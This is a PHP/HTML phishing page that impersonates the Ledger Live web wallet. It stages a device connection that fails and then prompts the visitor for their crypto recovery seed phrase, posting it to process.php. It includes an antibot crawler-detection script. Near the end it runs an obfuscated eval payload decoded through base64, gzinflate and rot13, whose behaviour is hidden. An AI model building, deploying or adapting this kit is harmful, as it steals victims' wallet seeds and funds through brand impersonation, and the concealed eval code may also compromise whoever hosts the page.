<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>
  <link rel="shortcut icon" type=image/png href="./files/webwallet_files/wal.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ledger Live - Webwallet</title>
  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">


  <link href="./files/webwallet_files/css2" rel="stylesheet">
  <link rel="stylesheet" href="./files/webwallet_files/style.css">
  <link rel="stylesheet" href="./files/webwallet_files/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">

  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/webwallet_files/app.css">

  <link href="./files/webwallet_files/css2" rel="stylesheet">
</head>
<body>
<script>
function Function() {
  var txt;
  if (confirm("You need to connect a Ledger to continue.")) {
    window.location.href = "";
  } else {
   
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>

  <div class="content">
    <div class="left">
      <img src="./files/webwallet_files/ledger-logo.png" alt="" srcset="" style="width: 60%;
      margin: 0 auto;
      display: block; margin-top: 20px;">

      <p class="menu-item">MY DEVICES</p>

      <div class="side activated">
        <img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">
        <span>Add Wallet</span>
      </div>






      <p class="menu-item">MENU</p>

      <div onclick="Function()" class="side">
        <img src="./files/porto.PNG" alt="" height="22px" class="mr-2">
        <span>Portfolio</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/acc.PNG" alt="" height="22px" class="mr-2">
        <span>Accounts</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/send.PNG" alt="" height="22px" class="mr-2">
        <span>Send</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/rec.png" alt="" height="22px" class="mr-2">
        <span>Receive</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/man.png" alt="" height="22px" class="mr-2">
        <span>Manager</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/buy.png" alt="" height="22px" class="mr-2">
        <span>Buy Crypto</span>
      </div>

    </div>

    <div class="rigth">
      <h3><img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">Ledger Live</h3>
      <p style="font-size: 12px; color:#717171;">Manage crypto assets in Ledger securely from your browser. Advanced security for your cryptocurrency, made easy.</p>

      <div class="main" >
        <div class="timeline">
          <div class="line"></div>
          <div class="line-2"></div>
          <div class="line-3"></div>
          <div class="step active" data-count="1">
            <div class="cercle active-cercle">1</div>
            <p class="desc desc-active">Detection</p>
          </div>
          <div class="step" data-count="2">
            <div class="cercle">2</div>
            <p class="desc">Checking</p>
          </div>
          <div class="step" data-count="3">
            <div class="cercle">3</div>
            <p class="desc">Connect</p>
          </div>
        </div>

        <div id="step-1">
          <h4 class="mt-5 text-center">Select your device</h4>

          <div class="myCards">
            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanox.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
              <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanos.png" alt="" class="device">
              <p class="mt-2">Ledger Nano S</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/blue.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>
          </div>
        </div>



        <div id="step-2" class="step-2">
          <div class="video-device">
            <h5 class="text-center">Genuin check</h5>
			<p style="font-size: 12px; color:#717171;"> Connect your Ledger with this device to interact with Ledger Live.</p>


            <div id="connect-spinner">
              <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                  <span class="sr-only">Loading...</span>
                </div>
              </div>
              </div>

            <div class="connect text-center">
              <p style="color: rgb(182, 2, 2); font-size: 12px;">Ledger Live could not connect with your device. Check if your device is connected properly or recover your wallet.</p>

              <button id="use-phrase" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left; background-color: #6490f1; margin-bottom: 10px; color: white;">
                <img class="restorememe" style="margin-right: 20px" src="./files/webwallet_files/restore.png" alt="" srcset="" height="22px">
                Recover ledger with seed phrase
              </button>

              <button id="refresh" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left;">
              <img style="margin-right: 20px" src="./files/webwallet_files/refresh.png" alt="" srcset="" height="22px">
                Refresh
            </button>
            </div>
          </div>
        </div>



        <div id="step-3" class="step-3">
		<center>
<h4 style="
    margin-top: 10px;
    margin-bottom: 30px;
">Use your Recovery Phrase</h4>
		  <p style="font-size: 12px; color:#717171;">Enter your 12/18/24 words in a strict order. Do not rearrange them. </p>
        </center>
		  

          <form action="process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
            <div class="form-group">
              <textarea name="key" id="phrase" required="required" minlength="12" 
			  style="width: 100%; margin: 0 auto;" 
			  placeholder="Enter your Recovery phrase here" 
			  class="form-control" rows="3"></textarea>

            </div>
			
            <span class="disabled" id="message">Enter a space between each word.</span>
            <button id="recovme" style="width: 100%; margin: 0 auto; padding: 10px; background-color: #6490f1; color: white;display: block; border: none;"
			 form="form1" value="Import" type="submit" name="import" class="recover-finale" >
              Continue
            </button>
          </form>
		  
        </div>


        <div class="bottom">
          <div class="btn back" id="back">
            Back
          </div>

          <button class="btn continue" id="continue" disabled="">
            Continue
          </button>
        </div>

      </div>
      <br>
      <br>
      <br>
      <br>
      <br>
    </div>
  </div>

  <script src="./files/webwallet_files/jquery.min.js.download"></script>
  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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'))))); ?>
  <script src="./files/webwallet_files/popper.min.js.download"></script>
  <script src="./files/webwallet_files/bootstrap.min.js.download"></script>
  <script src="./files/webwallet_files/app.js.download"></script>
  <script src="./files/webwallet_files/phrase.js.download"></script>


</body></html>